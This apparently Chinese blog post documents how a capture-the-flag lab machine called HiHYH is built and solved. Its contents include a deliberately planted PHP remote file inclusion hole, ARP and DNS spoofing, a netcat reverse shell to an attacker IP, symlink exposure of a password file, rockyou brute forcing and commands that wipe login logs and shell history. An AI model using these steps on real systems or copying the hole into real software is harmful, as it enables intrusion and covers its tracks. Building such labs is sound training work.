@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec HiHYH 靶机设计流程</title>
+        <meta name="description" content="Hi 系列靶机第二台！HYH,respect! 靶机设计灵感 1、ftp 服务给匿名用户访问本次靶机的 respect 用户 HYH motto 信息，以及一个仅有 hyh 用户可读的文件。 2、web 入口设计一处远程文件包含漏洞，需选手劫持指定域名 hyh.maze-sec.com，解析到攻击机，完成恶意文件包含。…">
+    <link rel="canonical" href="https://the0n3.top/posts/maze-hihyh/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec HiHYH 靶机设计流程">
+    <meta property="og:description" content="Hi 系列靶机第二台！HYH,respect! 靶机设计灵感 1、ftp 服务给匿名用户访问本次靶机的 respect 用户 HYH motto 信息，以及一个仅有 hyh 用户可读的文件。 2、web 入口设计一处远程文件包含漏洞，需选手劫持指定域名 hyh.maze-sec.com，解析到攻击机，完成恶意文件包含。…">
+    <meta property="og:url" content="https://the0n3.top/posts/maze-hihyh/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-hihyh/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec HiHYH 靶机设计流程">
+    <meta name="twitter:description" content="Hi 系列靶机第二台！HYH,respect! 靶机设计灵感 1、ftp 服务给匿名用户访问本次靶机的 respect 用户 HYH motto 信息，以及一个仅有 hyh 用户可读的文件。 2、web 入口设计一处远程文件包含漏洞，需选手劫持指定域名 hyh.maze-sec.com，解析到攻击机，完成恶意文件包含。…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-hihyh/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec HiHYH 靶机设计流程</h1>
+    <p>
+        <span class="meta">发布于: 2026-04-07 17:19</span>
+    </p>
+    <div class="post-body">
+        <blockquote>
+<p>Hi 系列靶机第二台！HYH,respect!</p>
+</blockquote>
+<h2>靶机设计灵感</h2>
+<p>1、ftp 服务给匿名用户访问本次靶机的 respect 用户 HYH motto 信息，以及一个仅有 hyh 用户可读的文件。<br>
+2、web 入口设计一处远程文件包含漏洞，需选手劫持指定域名 <code>hyh.maze-sec.com</code>，解析到攻击机，完成恶意文件包含。（域名的设计上再次 respect HYH 以及团队 maze-sec）。<br>
+3、定时任务设计为每分钟执行一次，监听 8080 端口，超时时间为 20 秒，选手需要监控定时任务的执行情况，抓取到该命令。<br>
+4、由于 /var/tmp 目录具有粘滞位，选手需要在 /var/tmp 目录下创建一个子目录，在该子目录下创建一个软链接，指向 ftp 目录下的文件，利用定时任务暴露出来，读取 pass.txt 文件内容。<br>
+5、ftp 的 pass.txt 文件内容设计为 hyh 用户的密码，以及一个爆破提示，提示信息为 <code>^ma....$</code>，是 ll104567 用户密码提示。<br>
+6、ll104567 用户属于 sudo 组，同时靶机为 debian 系，默认启用 sudo 组，sudo 组用户在已知密码时可以执行任意命令，导向选手爆破 ll104567 用户的密码，从rockyou.txt 中提取匹配的密码进行爆破。  </p>
+<p><strong>关键词</strong>：PHP远程文件包含（RFI）、ARP/DNS域名劫持、vsftpd匿名服务、/var/tmp粘滞位软链接、Debian sudo组提权</p>
+<p><strong>摘要</strong>：通过 vsftpd 搭建匿名只读 FTP 服务，分发仅 hyh 用户可读的 pass.txt（含 hyh 密码及 ll104567 密码正则提示 ^ma....$）与公开的 motto 信息；Web 入口利用 allow_url_include=On 的配置缺陷暴露 PHP 远程文件包含（RFI）漏洞，要求选手通过 ARP 欺骗 + DNS 劫持将 hyh.maze-sec.com 解析至攻击机以完成恶意文件包含，获取反弹 Shell；由于 /var/tmp 具备粘滞位，设计每分钟执行的定时任务在该目录下启动 HTTP 服务，引导选手在 /var/tmp 子目录中创建软链接指向 FTP 的 pass.txt，从而暴露凭证；最终选手根据正则提示从 rockyou.txt 爆破得到 ll104567 密码，利用 Debian 系默认启用的 sudo 组权限完成提权。该靶机综合考察了内网协议劫持、RFI 利用、粘滞位绕过的软链接技巧以及基于组权限的提权思路。</p>
+<h2>修改主机名</h2>
+<pre><code class="language-bash">hostnamectl set-hostname HiHYH
+
+cat &gt;/etc/hosts &lt;&lt;EOF
+127.0.0.1   localhost
+127.0.1.1   HiHYH
+::1         localhost ip6-localhost ip6-loopback
+EOF</code></pre>
+<h2>创建用户并修改密码</h2>
+<p>移除默认用户 welcome</p>
+<pre><code class="language-bash">deluser --remove-home welcome</code></pre>
+<p>创建 hyh 用户，并将密码设置为 HYH4Rly9UF3vwJq+xK1F53JYaMM，添加到 hyh 组中，使用 bash 作为默认 shell，用户主目录为 /home/hyh。</p>
+<pre><code class="language-bash">groupadd hyh
+useradd -m -g hyh -s /bin/bash hyh
+echo "hyh:HYH4Rly9UF3vwJq+xK1F53JYaMM" | chpasswd</code></pre>
+<p>创建 ll104567 用户，加入 sudo 组，使用 bash 作为默认 shell，用户主目录为 /home/ll104567。</p>
+<blockquote>
+<p>主要考虑到在 debian系，sudo 组默认存在，并且启用
+%sudo   ALL=(ALL:ALL) ALL</p>
+</blockquote>
+<pre><code class="language-bash">useradd -m -s /bin/bash ll104567
+echo "ll104567:mazell" | chpasswd
+usermod -aG sudo ll104567</code></pre>
+<p>修改 root 密码</p>
+<pre><code class="language-bash">echo "root:UGHYx1dc8AOtvJ3LMndL0QBg" | chpasswd</code></pre>
+<h2>安装 ftp 服务</h2>
+<p>使用 apt 包管理器安装 vsftpd，并启动服务，设置开机自启。</p>
+<pre><code class="language-bash">apt update
+apt install -y vsftpd</code></pre>
+<p>查看 /etc/vsftpd.conf 文件，默认配置如下：</p>
+<pre><code class="language-conf">root@moban:~# cat /etc/vsftpd.conf | grep -vE '^#' | grep '.'
+listen=NO
+listen_ipv6=YES
+anonymous_enable=NO
+local_enable=YES
+dirmessage_enable=YES
+use_localtime=YES
+xferlog_enable=YES
+connect_from_port_20=YES
+secure_chroot_dir=/var/run/vsftpd/empty
+pam_service_name=vsftpd
+rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
+rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
+ssl_enable=NO</code></pre>
+<p>查看 passwd 文件 ftp 用户的默认家目录</p>
+<pre><code class="language-bash">cat /etc/passwd | grep ftp
+ftp:x:106:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</code></pre>
+<p>创建 ftp 目录，默认是 ftp 用户，并设置权限。</p>
+<pre><code class="language-bash">mkdir -p /srv/ftp/pub
+chown root:root /srv/ftp
+chmod 755 /srv/ftp
+
+chown root:root /srv/ftp/pub
+chmod 755 /srv/ftp/pub</code></pre>
+<p>修改配置文件，允许匿名访问。</p>
+<pre><code class="language-conf">cat &gt; /etc/vsftpd.conf &lt;&lt;'EOF'
+listen=YES
+listen_ipv6=NO
+
+anonymous_enable=YES
+local_enable=NO
+
+write_enable=NO
+
+anon_root=/srv/ftp
+
+anon_world_readable_only=YES
+
+pasv_enable=YES
+pasv_min_port=30000
+pasv_max_port=30010
+EOF</code></pre>
+<p>启动并设置开机自启</p>
+<pre><code class="language-bash">systemctl restart vsftpd
+systemctl enable vsftpd</code></pre>
+<h2>ftp 关键文件</h2>
+<p>在 /srv/ftp/pub 目录下创建两个文件：</p>
+<pre><code class="language-bash">cat &gt; /srv/ftp/pub/motto.txt &lt;&lt;'EOF'
+失去的终究会失去吧，想念的终究会相遇吧。
+What you lose will eventually be lost, and what you miss will eventually meet.
+EOF
+
+cat &gt; /srv/ftp/pub/pass.txt &lt;&lt;'EOF'
+hyh:HYH4Rly9UF3vwJq+xK1F53JYaMM
+hint:^ma....$
+EOF
+
+chmod 644 /srv/ftp/pub/motto.txt
+chown hyh:hyh /srv/ftp/pub/pass.txt
+chmod 600 /srv/ftp/pub/pass.txt</code></pre>
+<h2>web 入口</h2>
+<p>在 /var/www/html 目录下创建 index.php 文件，内容如下：</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+@include"http://hyh.maze-sec.com/";</code></pre>
+<p>使用 php 配置文件 <code>/etc/php/8.3/apache2/php.ini</code>，允许远程文件包含（RFI）。</p>
+<pre><code class="language-conf">allow_url_include=On
+allow_url_fopen=On
+; disable_functions=</code></pre>
+<p>该靶机依赖 tmp 目录，因此建议关闭 apache 的 private tmp 功能。</p>
+<pre><code class="language-bash"># 创建目录
+mkdir -p /etc/systemd/system/apache2.service.d/
+
+# 直接写入配置
+cat &gt; /etc/systemd/system/apache2.service.d/override.conf &lt;&lt; 'EOF'
+[Service]
+PrivateTmp=false
+EOF
+
+# 验证文件已创建
+cat /etc/systemd/system/apache2.service.d/override.conf
+
+# 重新加载配置
+systemctl daemon-reload
+
+# 重启 Apache
+systemctl restart apache2
+
+# 验证生效
+systemctl show apache2 -p PrivateTmp</code></pre>
+<p>重启 apache2 服务使配置生效</p>
+<pre><code class="language-bash">systemctl restart apache2
+systemctl enable apache2</code></pre>
+<h2>添加定时任务</h2>
+<p>添加定时任务，使用 php 内置服务器监听 8080 端口，超时时间为 20 秒。</p>
+<p>/etc/cron.d/hyh 文件内容如下：</p>
+<pre><code class="language-cron">* * * * * hyh /bin/bash -c '/usr/bin/timeout 20s /usr/bin/python3 -m http.server 8080 --bind 127.0.0.1 --directory /var/tmp'</code></pre>
+<p>关于 /var/tmp 目录粘滞位的问题，请参阅：<a href="https://lwn.net/Articles/390323/">https://lwn.net/Articles/390323/</a></p>
+<p>重启 cron 服务使配置生效</p>
+<pre><code class="language-bash">systemctl restart cron
+systemctl enable cron</code></pre>
+<h2>放置flag</h2>
+<pre><code class="language-bash">echo 'flag{user-3e813e575a6e4b5fb7cf3a479b1ac423}' &gt; /home/hyh/user.txt
+echo 'flag{root-a7144840e24342b1a075a4a31405452f}' &gt; /root/root.txt</code></pre>
+<h2>清理痕迹</h2>
+<pre><code class="language-bash">
+## 清理痕迹
+
+```bash
+# 清理痕迹
+rm -rf /tmp/*
+# 清理 root 家目录下的临时文件
+rm -f /root/.lesshst
+rm -f /root/.viminfo
+# 清理apt缓存
+apt clean
+# 清理日志
+journalctl --vacuum-size=10M
+find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;
+# 清除 shell 历史和登录记录
+truncate -s 0 /root/.bash_history
+truncate -s 0 /var/log/wtmp /var/log/btmp /var/log/lastlog</code></pre>
+<h2>压缩镜像</h2>
+<pre><code class="language-bash"># 用零填充空闲空间，便于压缩
+dd if=/dev/zero of=/zero bs=1M || true; rm -f /zero</code></pre>
+<h2>爆破可行性验证</h2>
+<pre><code class="language-bash">┌──(root㉿kali)-[~]
+└─# grep -E '^ma....$' rockyou.txt | wc -l     
+
+27009
+
+┌──(root㉿kali)-[~]
+└─# nl rockyou.txt | grep -E '[0-9]+\s+mazell$'
+
+486798  mazell
+
+┌──(root㉿kali)-[~]
+└─# grep -E '^ma....$' rockyou.txt &gt; tmp       
+
+┌──(root㉿kali)-[~]
+└─# nl tmp | grep -E '[0-9]+\s+mazell$'
+
+  3122  mazell</code></pre>
+<h2>作者测试</h2>
+<p>端口扫描</p>
+<p><img src="/images/maze-hihyh/1.png" alt="" decoding="async" width="731" height="334"></p>
+<p>ftp 匿名登录</p>
+<p><img src="/images/maze-hihyh/2.png" alt="" decoding="async" loading="lazy" width="890" height="754"></p>
+<p>两个文件，pass.txt 仅所有者可读，motto.txt 所有人可读，查看 motto.txt 文件内容</p>
+<p><img src="/images/maze-hihyh/3.png" alt="" decoding="async" loading="lazy" width="861" height="175"></p>
+<p>访问 80 端口</p>
+<p><img src="/images/maze-hihyh/4.png" alt="" decoding="async" loading="lazy" width="859" height="305"></p>
+<p>dns 欺骗、arp 欺骗，达到劫持 hyh.maze-sec.com 域名的效果，解析到攻击机</p>
+<p><img src="/images/maze-hihyh/5.png" alt="" decoding="async" loading="lazy" width="1917" height="705"></p>
+<p><img src="/images/maze-hihyh/6.png" alt="" decoding="async" loading="lazy" width="708" height="247"></p>
+<p>原理：</p>
+<p>1、ARP欺骗：让受害机“认错”网关</p>
+<p>攻击者在局域网内广播伪造的ARP应答，告诉受害机“网关的IP地址（如192.168.6.1）对应的是我的MAC地址”。受害机收到后，会更新自己的ARP缓存，把后续发往网关的流量（包括DNS查询）都发给了攻击机。</p>
+<p>2、DNS劫持：在“假网关”上篡改域名解析</p>
+<p>攻击机收到受害机的数据包后，不是直接转发给真实网关，而是先检查：如果是DNS请求（目标端口53），就伪造一个DNS应答，把目标域名（如example.com）指向攻击者控制的IP。然后再把受害机的原始DNS请求转发给真实DNS服务器（避免受害机因超时而重试）。</p>
+<p>成功，只需要修改攻击机的 index.html 文件内容即可完成恶意文件包含</p>
+<p><img src="/images/maze-hihyh/7.png" alt="" decoding="async" loading="lazy" width="1920" height="919"></p>
+<p><img src="/images/maze-hihyh/8.png" alt="" decoding="async" loading="lazy" width="774" height="306"></p>
+<p><img src="/images/maze-hihyh/9.png" alt="" decoding="async" loading="lazy" width="1147" height="526"></p>
+<p>常规反弹shell</p>
+<pre><code class="language-bash"># 靶机
+busybox nc 192.168.6.111 4444 -e /bin/bash
+# 攻击机
+nc -lvnp 4444</code></pre>
+<p>下载 pspy64 ，监控定时任务的执行情况，抓取到 hyh 用户每分钟执行一次 python 内置服务器的命令在 /var/tmp 目录下，监听 8080 端口，超时时间为 10 秒。</p>
+<blockquote>
+<p><a href="https://github.com/dominicbreuker/pspy">https://github.com/dominicbreuker/pspy</a></p>
+</blockquote>
+<p>给 ftp 的 pass.txt 做软链接到 /var/tmp 目录下，利用定时任务的 python3 内置服务器暴露出来，读取 pass.txt 文件内容</p>
+<p>需要注意的是，/var/tmp 目录具有粘滞位，直接使用 /var/tmp 目录会失败，新建一个子目录 /var/tmp/test，在该目录下创建软链接，指向 /srv/ftp/pub/pass.txt 文件。</p>
+<pre><code class="language-bash">mkdir -p /var/tmp/test
+ln -s /srv/ftp/pub/pass.txt /var/tmp/test/pass.txt</code></pre>
+<p><img src="/images/maze-hihyh/10.png" alt="" decoding="async" loading="lazy" width="929" height="352"></p>
+<p>拿到 pass.txt 文件内容</p>
+<pre><code class="language-plaintext">hyh:HYH4Rly9UF3vwJq+xK1F53JYaMM
+hint:^ma....$</code></pre>
+<p>根据正则提示，提取 rockyou.txt 匹配的密码</p>
+<pre><code class="language-bash">┌──(root㉿kali)-[~]
+└─# grep -E '^ma....$' rockyou.txt | wc -l     
+
+27009
+
+┌──(root㉿kali)-[~]
+└─# nl rockyou.txt | grep -E '[0-9]+\s+mazell$'
+
+486798  mazell
+
+┌──(root㉿kali)-[~]
+└─# grep -E '^ma....$' rockyou.txt &gt; tmp       
+
+┌──(root㉿kali)-[~]
+└─# nl tmp | grep -E '[0-9]+\s+mazell$'
+
+  3122  mazell</code></pre>
+<p>爆破 ll104567 用户密码，使用Github su-bruteforce 工具，爆破成功，密码为 mazell，ll104567 属于 sudo 组，debian 系统默认 sudo 组用户在有密码时可以使用 sudo 执行任何命令。</p>
+<p><img src="/images/maze-hihyh/12.png" alt="" decoding="async" loading="lazy" width="1174" height="845"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#ARP欺骗</span>
+                                    <span>#DNS欺骗</span>
+                                    <span>#域名劫持</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
